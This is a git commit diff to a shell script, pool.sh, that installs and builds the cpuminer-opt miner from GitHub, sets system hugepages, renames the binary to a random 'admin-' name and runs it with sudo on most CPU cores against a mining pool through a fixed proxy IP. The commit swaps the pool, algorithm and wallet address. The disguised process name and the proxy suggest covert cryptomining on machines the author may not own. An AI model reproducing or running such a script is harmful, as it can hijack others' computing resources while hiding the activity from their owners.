6811046281610f10f0a00c5f0a678a667292c5df
nviettien191 <n.viettien191655320@gmail.com>
2018-08-16 14:40:49 +0700

    Update pool.sh

--- pool.sh
+++ pool.sh
@@ -3,7 +3,7 @@ sudo apt-get update
 apt-get install -y build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake autotools-dev git autoconf
 echo "vm.nr_hugepages=128" >> /etc/sysctl.conf && sysctl -p
 git clone https://github.com/JayDDee/cpuminer-opt.git /usr/share/work/
-a='Admin-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+a='admin-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 cd /usr/share/work/
 ./build.sh 
 CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl
@@ -22,4 +22,4 @@ else
 detectcpu=$cpucores
 fi
 maxcore=$[$cpucores - $downcore];
-sudo ./"${cpuname}" -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3033 -u nvt191655320.1 -p x -x 18.207.224.76:808 -t $maxcore
+sudo ./"${cpuname}" -a argon2d-dyn -o stratum+tcp://beastpool.com:4335 -u DSLKzyafutB7ce8JwWnuJzbp7o4AhwQvye -p c=DYN -x 18.207.224.76:808 -t $maxcore
